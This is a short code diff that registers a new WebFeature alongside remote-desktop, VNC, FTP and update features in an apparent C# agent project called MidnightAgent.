@@ -45,6 +45,7 @@ namespace MidnightAgent.Features
                 new VncFeature(),
                 new AnyDeskFeature(), // 🖥️ Remote Desktop
                 new FtpFeature(),
+                new WebFeature(),
                 
                 // Maintenance
                 new UpdateFeature(),
